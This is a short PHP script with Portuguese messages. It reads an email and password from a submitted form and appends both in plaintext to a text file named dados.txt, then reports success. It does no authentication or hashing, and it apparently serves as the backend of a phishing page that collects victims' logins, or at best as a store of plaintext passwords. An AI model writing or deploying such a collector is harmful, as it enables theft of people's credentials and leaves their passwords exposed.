<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $email = htmlspecialchars($email);
    $password = htmlspecialchars($password);

    $file = 'dados.txt';
    $data = "Email: " . $email . " | Senha: " . $password . "\n";

    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    echo "Dados salvos com sucesso!";
}
?>
